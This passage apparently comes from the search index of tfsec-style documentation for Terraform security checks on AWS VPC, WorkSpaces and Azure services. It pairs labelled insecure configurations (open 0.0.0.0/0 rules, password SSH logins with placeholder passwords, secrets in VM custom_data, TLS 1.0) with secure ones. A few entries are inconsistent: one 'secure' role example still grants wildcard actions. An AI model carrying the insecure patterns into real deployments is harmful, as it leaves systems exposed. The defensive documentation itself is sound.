Terraform.</p>","title":"Explanation"},{"location":"checks/aws/vpc/no-default-vpc/#possible-impact","text":"<p>The default VPC does not have critical security features applied</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/no-default-vpc/#suggested-resolution","text":"<p>Create a non-default vpc for resources to be created in</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/no-default-vpc/#insecure-example","text":"<p>The following example will fail the aws-vpc-no-default-vpc check. <pre><code> resource \"aws_default_vpc\" \"default\" {\n    tags = {\n      Name = \"Default VPC\"\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/no-default-vpc/#secure-example","text":"<p>The following example will pass the aws-vpc-no-default-vpc check. <pre><code> # no aws default vpc present\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/no-default-vpc/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc</p> </li> <li> <p>https://docs.aws.amazon.com/vpc/latest/userguide/default-vpc.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/no-excessive-port-access/","text":"","title":"An ingress Network ACL rule allows ALL ports."},{"location":"checks/aws/vpc/no-excessive-port-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/vpc/no-excessive-port-access/#explanation","text":"<p>Ensure access to specific required ports is allowed, and nothing else.</p>","title":"Explanation"},{"location":"checks/aws/vpc/no-excessive-port-access/#possible-impact","text":"<p>All ports exposed for egressing data</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/no-excessive-port-access/#suggested-resolution","text":"<p>Set specific allowed ports</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/no-excessive-port-access/#insecure-example","text":"<p>The following example will fail the aws-vpc-no-excessive-port-access check. <pre><code> resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"all\"\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/no-excessive-port-access/#secure-example","text":"<p>The following example will pass the aws-vpc-no-excessive-port-access check. <pre><code> resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/no-excessive-port-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port</p> </li> <li> <p>https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/no-public-egress-sgr/","text":"","title":"An egress security group rule allows traffic to /0."},{"location":"checks/aws/vpc/no-public-egress-sgr/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/vpc/no-public-egress-sgr/#explanation","text":"<p>Opening up ports to connect out to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that are explicitly required where possible.</p>","title":"Explanation"},{"location":"checks/aws/vpc/no-public-egress-sgr/#possible-impact","text":"<p>Your port is egressing data to the internet</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/no-public-egress-sgr/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/no-public-egress-sgr/#insecure-example","text":"<p>The following example will fail the aws-vpc-no-public-egress-sgr check. <pre><code> resource \"aws_security_group\" \"bad_example\" {\n    egress {\n        cidr_blocks = [\"0.0.0.0/0\"]\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/no-public-egress-sgr/#secure-example","text":"<p>The following example will pass the aws-vpc-no-public-egress-sgr check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n    egress {\n        cidr_blocks = [\"1.2.3.4/32\"]\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/no-public-egress-sgr/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group</p> </li> <li> <p>https://docs.aws.amazon.com/whitepapers/latest/building-scalable-secure-multi-vpc-network-infrastructure/centralized-egress-to-internet.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/no-public-ingress-acl/","text":"","title":"An ingress Network ACL rule allows specific ports from /0."},{"location":"checks/aws/vpc/no-public-ingress-acl/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/vpc/no-public-ingress-acl/#explanation","text":"<p>Opening up ACLs to the public internet is potentially dangerous. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/aws/vpc/no-public-ingress-acl/#possible-impact","text":"<p>The ports are exposed for ingressing data to the internet</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/no-public-ingress-acl/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/no-public-ingress-acl/#insecure-example","text":"<p>The following example will fail the aws-vpc-no-public-ingress-acl check. <pre><code> resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/no-public-ingress-acl/#secure-example","text":"<p>The following example will pass the aws-vpc-no-public-ingress-acl check. <pre><code> resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"10.0.0.0/16\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/no-public-ingress-acl/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block</p> </li> <li> <p>https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/no-public-ingress-sgr/","text":"","title":"An ingress security group rule allows traffic from /0."},{"location":"checks/aws/vpc/no-public-ingress-sgr/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/vpc/no-public-ingress-sgr/#explanation","text":"<p>Opening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/aws/vpc/no-public-ingress-sgr/#possible-impact","text":"<p>Your port exposed to the internet</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/no-public-ingress-sgr/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/no-public-ingress-sgr/#insecure-example","text":"<p>The following example will fail the aws-vpc-no-public-ingress-sgr check. <pre><code> resource \"aws_security_group_rule\" \"bad_example\" {\n    type = \"ingress\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/no-public-ingress-sgr/#secure-example","text":"<p>The following example will pass the aws-vpc-no-public-ingress-sgr check. <pre><code> resource \"aws_security_group_rule\" \"good_example\" {\n    type = \"ingress\"\n    cidr_blocks = [\"10.0.0.0/16\"]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/no-public-ingress-sgr/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/security-group-rules-reference.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/workspaces/","text":"","title":"workspaces"},{"location":"checks/aws/workspaces/#checks","text":"<ul> <li>enable-disk-encryption Root and user volumes on Workspaces should be encrypted</li> </ul>","title":"Checks"},{"location":"checks/aws/workspaces/enable-disk-encryption/","text":"","title":"Root and user volumes on Workspaces should be encrypted"},{"location":"checks/aws/workspaces/enable-disk-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/workspaces/enable-disk-encryption/#explanation","text":"<p>Workspace volumes for both user and root should be encrypted to protect the data stored on them.</p>","title":"Explanation"},{"location":"checks/aws/workspaces/enable-disk-encryption/#possible-impact","text":"<p>Data can be freely read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/workspaces/enable-disk-encryption/#suggested-resolution","text":"<p>Root and user volume encryption should be enabled</p>","title":"Suggested Resolution"},{"location":"checks/aws/workspaces/enable-disk-encryption/#insecure-example","text":"<p>The following example will fail the aws-workspaces-enable-disk-encryption check. <pre><code> resource \"aws_workspaces_workspace\" \"bad_example\" {\n    directory_id = aws_workspaces_directory.test.id\n    bundle_id    = data.aws_workspaces_bundle.value_windows_10.id\n    user_name    = \"Administrator\"\n\n    workspace_properties {\n      compute_type_name                         = \"VALUE\"\n      user_volume_size_gib                      = 10\n      root_volume_size_gib                      = 80\n      running_mode                              = \"AUTO_STOP\"\n      running_mode_auto_stop_timeout_in_minutes = 60\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/workspaces/enable-disk-encryption/#secure-example","text":"<p>The following example will pass the aws-workspaces-enable-disk-encryption check. <pre><code> resource \"aws_workspaces_workspace\" \"good_example\" {\n        directory_id                   = aws_workspaces_directory.test.id\n        bundle_id                      = data.aws_workspaces_bundle.value_windows_10.id\n        user_name                      = \"Administrator\"\n        root_volume_encryption_enabled = true\n        user_volume_encryption_enabled = true\n\n        workspace_properties {\n          compute_type_name                         = \"VALUE\"\n          user_volume_size_gib                      = 10\n          root_volume_size_gib                      = 80\n          running_mode                              = \"AUTO_STOP\"\n          running_mode_auto_stop_timeout_in_minutes = 60\n        }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/workspaces/enable-disk-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled</p> </li> <li> <p>https://docs.aws.amazon.com/workspaces/latest/adminguide/encrypt-workspaces.html</p> </li> </ul>","title":"Links"},{"location":"checks/azure/","text":"","title":"azure"},{"location":"checks/azure/#services","text":"<ul> <li> <p>appservice</p> </li> <li> <p>authorization</p> </li> <li> <p>compute</p> </li> <li> <p>container</p> </li> <li> <p>database</p> </li> <li> <p>datafactory</p> </li> <li> <p>datalake</p> </li> <li> <p>keyvault</p> </li> <li> <p>monitor</p> </li> <li> <p>network</p> </li> <li> <p>security-center</p> </li> <li> <p>storage</p> </li> <li> <p>synapse</p> </li> </ul>","title":"Services"},{"location":"checks/azure/appservice/","text":"","title":"appservice"},{"location":"checks/azure/appservice/#checks","text":"<ul> <li> <p>account-identity-registered Web App has registration with AD enabled</p> </li> <li> <p>authentication-enabled App Service authentication is activated</p> </li> <li> <p>enable-http2 Web App uses the latest HTTP version</p> </li> <li> <p>enforce-https Ensure the Function App can only be accessed via HTTPS. The default is false.</p> </li> <li> <p>require-client-cert Web App accepts incoming client certificate</p> </li> <li> <p>use-secure-tls-policy Web App uses latest TLS version</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/appservice/account-identity-registered/","text":"","title":"Web App has registration with AD enabled"},{"location":"checks/azure/appservice/account-identity-registered/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/appservice/account-identity-registered/#explanation","text":"<p>Registering the identity used by an App with AD allows it to interact with other services without using username and password</p>","title":"Explanation"},{"location":"checks/azure/appservice/account-identity-registered/#possible-impact","text":"<p>Interaction between services can't easily be achieved without username/password</p>","title":"Possible Impact"},{"location":"checks/azure/appservice/account-identity-registered/#suggested-resolution","text":"<p>Register the app identity with AD</p>","title":"Suggested Resolution"},{"location":"checks/azure/appservice/account-identity-registered/#insecure-example","text":"<p>The following example will fail the azure-appservice-account-identity-registered check. <pre><code> resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/appservice/account-identity-registered/#secure-example","text":"<p>The following example will pass the azure-appservice-account-identity-registered check. <pre><code> resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n\n   identity {\n     type = \"UserAssigned\"\n     identity_ids = \"webapp1\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/appservice/account-identity-registered/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity</li> </ul>","title":"Links"},{"location":"checks/azure/appservice/authentication-enabled/","text":"","title":"App Service authentication is activated"},{"location":"checks/azure/appservice/authentication-enabled/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/appservice/authentication-enabled/#explanation","text":"<p>Enabling authentication ensures that all communications in the application are authenticated. The auth_settings block needs to be filled out with the appropriate auth backend settings</p>","title":"Explanation"},{"location":"checks/azure/appservice/authentication-enabled/#possible-impact","text":"<p>Anonymous HTTP requests will be accepted</p>","title":"Possible Impact"},{"location":"checks/azure/appservice/authentication-enabled/#suggested-resolution","text":"<p>Enable authentication to prevent anonymous request being accepted</p>","title":"Suggested Resolution"},{"location":"checks/azure/appservice/authentication-enabled/#insecure-example","text":"<p>The following example will fail the azure-appservice-authentication-enabled check. <pre><code> resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/appservice/authentication-enabled/#secure-example","text":"<p>The following example will pass the azure-appservice-authentication-enabled check. <pre><code> resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n\n   auth_settings {\n     enabled = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/appservice/authentication-enabled/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled</li> </ul>","title":"Links"},{"location":"checks/azure/appservice/enable-http2/","text":"","title":"Web App uses the latest HTTP version"},{"location":"checks/azure/appservice/enable-http2/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/appservice/enable-http2/#explanation","text":"<p>Use the latest version of HTTP to ensure you are benefiting from security fixes</p>","title":"Explanation"},{"location":"checks/azure/appservice/enable-http2/#possible-impact","text":"<p>Outdated versions of HTTP has security vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/azure/appservice/enable-http2/#suggested-resolution","text":"<p>Use the latest version of HTTP</p>","title":"Suggested Resolution"},{"location":"checks/azure/appservice/enable-http2/#insecure-example","text":"<p>The following example will fail the azure-appservice-enable-http2 check. <pre><code> resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/appservice/enable-http2/#secure-example","text":"<p>The following example will pass the azure-appservice-enable-http2 check. <pre><code> resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n\n   site_config {\n      http2_enabled = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/appservice/enable-http2/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled</li> </ul>","title":"Links"},{"location":"checks/azure/appservice/enforce-https/","text":"","title":"Ensure the Function App can only be accessed via HTTPS. The default is false."},{"location":"checks/azure/appservice/enforce-https/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/appservice/enforce-https/#explanation","text":"<p>By default, clients can connect to function endpoints by using both HTTP or HTTPS. You should redirect HTTP to HTTPs because HTTPS uses the SSL/TLS protocol to provide a secure connection, which is both encrypted and authenticated.</p>","title":"Explanation"},{"location":"checks/azure/appservice/enforce-https/#possible-impact","text":"<p>Anyone can access the Function App using HTTP.</p>","title":"Possible Impact"},{"location":"checks/azure/appservice/enforce-https/#suggested-resolution","text":"<p>You can redirect all HTTP requests to the HTTPS port.</p>","title":"Suggested Resolution"},{"location":"checks/azure/appservice/enforce-https/#insecure-example","text":"<p>The following example will fail the azure-appservice-enforce-https check. <pre><code> resource \"azurerm_function_app\" \"bad_example\" {\n   name                       = \"test-azure-functions\"\n   location                   = azurerm_resource_group.example.location\n   resource_group_name        = azurerm_resource_group.example.name\n   app_service_plan_id        = azurerm_app_service_plan.example.id\n   storage_account_name       = azurerm_storage_account.example.name\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   os_type                    = \"linux\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/appservice/enforce-https/#secure-example","text":"<p>The following example will pass the azure-appservice-enforce-https check. <pre><code> resource \"azurerm_function_app\" \"good_example\" {\n   name                       = \"test-azure-functions\"\n   location                   = azurerm_resource_group.example.location\n   resource_group_name        = azurerm_resource_group.example.name\n   app_service_plan_id        = azurerm_app_service_plan.example.id\n   storage_account_name       = azurerm_storage_account.example.name\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   os_type                    = \"linux\"\n   https_only                 = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/appservice/enforce-https/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/app-service/configure-ssl-bindings#enforce-https</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/azure-functions/security-concepts</p> </li> </ul>","title":"Links"},{"location":"checks/azure/appservice/require-client-cert/","text":"","title":"Web App accepts incoming client certificate"},{"location":"checks/azure/appservice/require-client-cert/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/appservice/require-client-cert/#explanation","text":"<p>The TLS mutual authentication technique in enterprise environments ensures the authenticity of clients to the server. If incoming client certificates are enabled only an authenticated client with valid certificates can access the app.</p>","title":"Explanation"},{"location":"checks/azure/appservice/require-client-cert/#possible-impact","text":"<p>Mutual TLS is not being used</p>","title":"Possible Impact"},{"location":"checks/azure/appservice/require-client-cert/#suggested-resolution","text":"<p>Enable incoming certificates for clients</p>","title":"Suggested Resolution"},{"location":"checks/azure/appservice/require-client-cert/#insecure-example","text":"<p>The following example will fail the azure-appservice-require-client-cert check. <pre><code> resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/appservice/require-client-cert/#secure-example","text":"<p>The following example will pass the azure-appservice-require-client-cert check. <pre><code> resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n   client_cert_enabled = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/appservice/require-client-cert/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled</li> </ul>","title":"Links"},{"location":"checks/azure/appservice/use-secure-tls-policy/","text":"","title":"Web App uses latest TLS version"},{"location":"checks/azure/appservice/use-secure-tls-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/appservice/use-secure-tls-policy/#explanation","text":"<p>Use a more recent TLS/SSL policy for the App Service</p>","title":"Explanation"},{"location":"checks/azure/appservice/use-secure-tls-policy/#possible-impact","text":"<p>The minimum TLS version for apps should be TLS1_2</p>","title":"Possible Impact"},{"location":"checks/azure/appservice/use-secure-tls-policy/#suggested-resolution","text":"<p>The TLS version being outdated and has known vulnerabilities</p>","title":"Suggested Resolution"},{"location":"checks/azure/appservice/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the azure-appservice-use-secure-tls-policy check. <pre><code> resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n\n   site_config {\n      min_tls_version = \"1.0\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/appservice/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the azure-appservice-use-secure-tls-policy check. <pre><code> resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/appservice/use-secure-tls-policy/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version</li> </ul>","title":"Links"},{"location":"checks/azure/authorization/","text":"","title":"authorization"},{"location":"checks/azure/authorization/#checks","text":"<ul> <li>limit-role-actions Roles limited to the required actions</li> </ul>","title":"Checks"},{"location":"checks/azure/authorization/limit-role-actions/","text":"","title":"Roles limited to the required actions"},{"location":"checks/azure/authorization/limit-role-actions/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/authorization/limit-role-actions/#explanation","text":"<p>The permissions granted to a role should be kept to the minimum required to be able to do the task. Wildcard permissions must not be used.</p>","title":"Explanation"},{"location":"checks/azure/authorization/limit-role-actions/#possible-impact","text":"<p>Open permissions for subscriptions could result in an easily compromisable account</p>","title":"Possible Impact"},{"location":"checks/azure/authorization/limit-role-actions/#suggested-resolution","text":"<p>Use targeted permissions for roles</p>","title":"Suggested Resolution"},{"location":"checks/azure/authorization/limit-role-actions/#insecure-example","text":"<p>The following example will fail the azure-authorization-limit-role-actions check. <pre><code> data \"azurerm_subscription\" \"primary\" {\n }\n\n resource \"azurerm_role_definition\" \"example\" {\n   name        = \"my-custom-role\"\n   scope       = data.azurerm_subscription.primary.id\n   description = \"This is a custom role created via Terraform\"\n\n   permissions {\n     actions     = [\"*\"]\n     not_actions = []\n   }\n\n   assignable_scopes = [\n     \"/\"\n   ]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/authorization/limit-role-actions/#secure-example","text":"<p>The following example will pass the azure-authorization-limit-role-actions check. <pre><code> data \"azurerm_subscription\" \"primary\" {\n }\n\n resource \"azurerm_role_definition\" \"example\" {\n   name        = \"my-custom-role\"\n   scope       = data.azurerm_subscription.primary.id\n   description = \"This is a custom role created via Terraform\"\n\n   permissions {\n     actions     = [\"*\"]\n     not_actions = []\n   }\n\n   assignable_scopes = [\n     data.azurerm_subscription.primary.id,\n   ]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/authorization/limit-role-actions/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions</li> </ul>","title":"Links"},{"location":"checks/azure/compute/","text":"","title":"compute"},{"location":"checks/azure/compute/#checks","text":"<ul> <li> <p>disable-password-authentication Password authentication should be disabled on Azure virtual machines</p> </li> <li> <p>enable-disk-encryption Enable disk encryption on managed disk</p> </li> <li> <p>no-secrets-in-custom-data Ensure that no sensitive credentials are exposed in VM custom_data</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/compute/disable-password-authentication/","text":"","title":"Password authentication should be disabled on Azure virtual machines"},{"location":"checks/azure/compute/disable-password-authentication/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/compute/disable-password-authentication/#explanation","text":"<p>Access to virtual machines should be authenticated using SSH keys. Removing the option of password authentication enforces more secure methods while removing the risks inherent with passwords.</p>","title":"Explanation"},{"location":"checks/azure/compute/disable-password-authentication/#possible-impact","text":"<p>Using password authentication is less secure that ssh keys may result in compromised servers</p>","title":"Possible Impact"},{"location":"checks/azure/compute/disable-password-authentication/#suggested-resolution","text":"<p>Use ssh authentication for virtual machines</p>","title":"Suggested Resolution"},{"location":"checks/azure/compute/disable-password-authentication/#insecure-example","text":"<p>The following example will fail the azure-compute-disable-password-authentication check. <pre><code> resource \"azurerm_linux_virtual_machine\" \"bad_linux_example\" {\n   name                            = \"bad-linux-machine\"\n   resource_group_name             = azurerm_resource_group.example.name\n   location                        = azurerm_resource_group.example.location\n   size                            = \"Standard_F2\"\n   admin_username                  = \"adminuser\"\n   admin_password                  = \"somePassword\"\n   disable_password_authentication = false\n }\n\n resource \"azurerm_virtual_machine\" \"bad_example\" {\n    name                            = \"bad-linux-machine\"\n    resource_group_name             = azurerm_resource_group.example.name\n    location                        = azurerm_resource_group.example.location\n    size                            = \"Standard_F2\"\n    admin_username                  = \"adminuser\"\n    admin_password                  = \"somePassword\"\n\n    os_profile {\n        computer_name  = \"hostname\"\n        admin_username = \"testadmin\"\n        admin_password = \"Password1234!\"\n    }\n\n    os_profile_linux_config {\n        disable_password_authentication = false\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/compute/disable-password-authentication/#secure-example","text":"<p>The following example will pass the azure-compute-disable-password-authentication check. <pre><code> resource \"azurerm_linux_virtual_machine\" \"good_linux_example\" {\n   name                            = \"good-linux-machine\"\n   resource_group_name             = azurerm_resource_group.example.name\n   location                        = azurerm_resource_group.example.location\n   size                            = \"Standard_F2\"\n   admin_username                  = \"adminuser\"\n   admin_password                  = \"somePassword\"\n\n   admin_ssh_key {\n     username   = \"adminuser\"\n     public_key = file(\"~/.ssh/id_rsa.pub\")\n   }\n }\n\n resource \"azurerm_virtual_machine\" \"good_example\" {\n    name                            = \"good-linux-machine\"\n    resource_group_name             = azurerm_resource_group.example.name\n    location                        = azurerm_resource_group.example.location\n    size                            = \"Standard_F2\"\n    admin_username                  = \"adminuser\"\n\n\n    os_profile_linux_config {\n        ssh_keys = [{\n            key_data = file(\"~/.ssh/id_rsa.pub\")\n            path = \"~/.ssh/id_rsa.pub\"\n        }]\n\n        disable_password_authentication = true\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/compute/disable-password-authentication/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication</p> </li> </ul>","title":"Links"},{"location":"checks/azure/compute/enable-disk-encryption/","text":"","title":"Enable disk encryption on managed disk"},{"location":"checks/azure/compute/enable-disk-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/compute/enable-disk-encryption/#explanation","text":"<p>Manage disks should be encrypted at rest. When specifying the <code>encryption_settings</code> block, the enabled attribute should be set to <code>true</code>.</p>","title":"Explanation"},{"location":"checks/azure/compute/enable-disk-encryption/#possible-impact","text":"<p>Data could be read if compromised</p>","title":"Possible Impact"},{"location":"checks/azure/compute/enable-disk-encryption/#suggested-resolution","text":"<p>Enable encryption on managed disks</p>","title":"Suggested Resolution"},{"location":"checks/azure/compute/enable-disk-encryption/#insecure-example","text":"<p>The following example will fail the azure-compute-enable-disk-encryption check. <pre><code> resource \"azurerm_managed_disk\" \"bad_example\" {\n    encryption_settings {\n        enabled = false\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/compute/enable-disk-encryption/#secure-example","text":"<p>The following example will pass the azure-compute-enable-disk-encryption check. <pre><code> resource \"azurerm_managed_disk\" \"good_example\" {\n    encryption_settings {\n        enabled = true\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/compute/enable-disk-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/virtual-machines/linux/disk-encryption</p> </li> </ul>","title":"Links"},{"location":"checks/azure/compute/no-secrets-in-custom-data/","text":"","title":"Ensure that no sensitive credentials are exposed in VM custom_data"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#explanation","text":"<p>When creating Azure Virtual Machines, custom_data is used to pass start up information into the EC2 instance. This custom_dat must not contain access key credentials.</p>","title":"Explanation"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#possible-impact","text":"<p>Sensitive credentials in custom_data can be leaked</p>","title":"Possible Impact"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#suggested-resolution","text":"<p>Don't use sensitive credentials in the VM custom_data</p>","title":"Suggested Resolution"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#insecure-example","text":"<p>The following example will fail the azure-compute-no-secrets-in-custom-data check. <pre><code> resource \"azurerm_virtual_machine\" \"bad_example\" {\n    name = \"bad_example\"\n    os_profile_linux_config {\n        disable_password_authentication = false\n    }\n    os_profile {\n        custom_data =&lt;&lt;EOF\n            export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n            EOF\n    }\n }\n</code></pre></p>","title":"Insecure 